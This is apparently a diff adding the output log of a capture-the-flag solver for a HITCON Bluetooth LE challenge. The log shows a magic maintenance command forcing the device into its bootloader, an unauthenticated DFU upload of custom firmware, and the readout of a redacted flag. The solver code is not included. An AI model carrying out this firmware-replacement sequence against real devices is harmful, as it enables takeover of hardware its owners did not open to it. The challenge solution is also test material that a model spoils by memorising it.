@@ -1,0 +1,36 @@
+# Verified transcript: exact remote execution output supplied by the user in this chat.
+# The pip installation output preceding this successful run is omitted.
+# This is not an independently captured network transcript.
+
+$ python3 yaju_solve.py --offline-check
+OFFLINE_PASS: vector, SVC, init packet; image length 176 CRC16 0x11cc
+$ python3 -u yaju_solve.py <host> 6402
+[*] Connecting to HCI transport tcp-client:<host>:6402
+[+] Connected for maintenance on attempt 1
+[+] GATT: UUID-16:2A00 (Device Name)[0x2], UUID-16:2A01 (Appearance)[0x2], UUID-16:2A05 (Service Changed)[0x20], UUID-16:2B29 (Client Supported Features)[0xa], UUID-16:2B2A (Database Hash)[0x2], 5A1C0002-7C5D-4C8D-942C-A786C1D58B6D[0x8], 5A1C0003-7C5D-4C8D-942C-A786C1D58B6D[0x2], 5A1C1002-7C5D-4C8D-942C-A786C1D58B6D[0x2]
+[*] Writing obfuscated maintenance command: 11451419198100
+[+] maintenance: remote controller disconnected for reset
+[+] Connected for bootloader on attempt 1
+[+] GATT: UUID-16:2A00 (Device Name)[0x2], UUID-16:2A01 (Appearance)[0x2], UUID-16:2A05 (Service Changed)[0x20], UUID-16:2B29 (Client Supported Features)[0xa], UUID-16:2B2A (Database Hash)[0x2], 00001532-1212-EFDE-1523-785FEABCD123[0x4], 00001531-1212-EFDE-1523-785FEABCD123[0x18], 00001534-1212-EFDE-1523-785FEABCD123[0x2]
+[+] DFU notifications enabled
+[+] image: 176 bytes, CRC16=11cc, init=ffffffff000000000100feffcc11
+    -> CTRL 0104
+    <- notify 100101
+[+] DFU opcode 01 OK
+    -> CTRL 0200
+    -> CTRL 0201
+    <- notify 100201
+[+] DFU opcode 02 OK
+    -> CTRL 03
+    <- notify 100301
+[+] DFU opcode 03 OK
+    -> CTRL 04
+    <- notify 100401
+[+] DFU opcode 04 OK
+[*] Activating uploaded Thumb firmware...
+    -> CTRL 05
+[+] DFU: remote controller disconnected for reset
+[+] Connected for uploaded application on attempt 1
+[+] GATT: UUID-16:2A00 (Device Name)[0x2], UUID-16:2A01 (Appearance)[0x2], UUID-16:2A05 (Service Changed)[0x20], UUID-16:2B29 (Client Supported Features)[0xa], UUID-16:2B2A (Database Hash)[0x2], 66551235-3322-1100-F0EE-CCAA88664422[0x2]
+[+] GPIO secret: b'hitcon{...}\n'
+FLAG: hitcon{...}
